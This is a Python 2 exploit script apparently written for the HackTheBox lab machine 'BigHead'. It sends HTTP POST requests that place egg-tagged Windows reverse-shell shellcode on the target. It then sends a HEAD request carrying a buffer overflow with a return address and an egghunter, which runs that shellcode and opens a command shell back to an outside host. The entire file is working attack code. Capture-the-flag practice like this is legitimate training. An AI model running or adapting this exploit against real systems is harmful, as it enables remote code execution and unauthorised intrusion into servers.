#!/usr/bin/env python
#-*- coding: utf-8 -*-

import re
import sys
import binascii
import socket

def poison(HOST,PORT,EGG,N=32):

	buf =  ""
	buf += "fce8820000006089e531c0648b"
	buf += "50308b520c8b52148b72280fb7"
	buf += "4a2631ffac3c617c022c20c1cf"
	buf += "0d01c7e2f252578b52108b4a3c"
	buf += "8b4c1178e34801d1518b592001"
	buf += "d38b4918e33a498b348b01d631"
	buf += "ffacc1cf0d01c738e075f6037d"
	buf += "f83b7d2475e4588b582401d366"
	buf += "8b0c4b8b581c01d38b048b01d0"
	buf += "894424245b5b61595a51ffe05f"
	buf += "5f5a8b12eb8d5d683332000068"
	buf += "7773325f54684c772607ffd5b8"
	buf += "9001000029c454506829806b00"
	buf += "ffd5505050504050405068ea0f"
	buf += "dfe0ffd5976a05680a0a0e0968"
	buf += "0200270f89e66a1056576899a5"
	buf += "7461ffd585c0740cff4e0875ec"
	buf += "68f0b5a256ffd568636d640089"
	buf += "e357575731f66a125956e2fd66"
	buf += "c744243c01018d442410c60044"
	buf += "545056565646564e5656535668"
	buf += "79cc3f86ffd589e04e5646ff30"
	buf += "6808871d60ffd5bbf0b5a25668"
	buf += "a695bd9dffd53c067c0a80fbe0"
	buf += "7505bb4713726f6a0053ffd5"



	payload = (EGG*2) + binascii.unhexlify(buf)

	for i in xrange(1,N+1):
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
		try:
			s.connect((HOST,PORT))
			s.send("POST / HTTP/1.1\r\n")
			s.send("Host: dev.bighead.htb\r\n")
			s.send("Content-Length: %d\r\n"%len(payload))
			s.send("\r\n")
			s.send(payload+"\r\n")
			s.send("\r\n")
			print "0x%02x"%i,re.sub(r"\s"," ",s.recv(24).strip())
		except socket.error as ex:
			print(ex)
		finally: s.close()

def exploit(HOST,PORT,EGG):
	if len(EGG) < 8: EGG = binascii.hexlify(EGG)
	EGG_HUNTER = "6681caff0f42526a0258cd2e3c055a74efb8" + EGG + "8bfaaf75eaaf75e7ffe7"
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
	try:
		s.connect((HOST,PORT))
		s.settimeout(None)
		s.send("HEAD /" + ("41"*36) + "f0125062" + EGG_HUNTER + " HTTP/1.1\r\n")
		s.send("Host: dev.bighead.htb\r\n")
		s.send("\r\n")
		print re.sub(r"\s"," ",s.recv(32).strip())
	except socket.error as ex:
		print(ex)
	finally: s.close()

if __name__ == "__main__":


	HOST = "10.10.10.112"
	PORT = 80

	EGG = "ABZY"

	print("[*] Stack poison starting...")
	poison(HOST,PORT,EGG)
	print("[*] Poisoning over, sending the EGGHUNTER")
	exploit(HOST,PORT,EGG)
	print("[*] All done!")
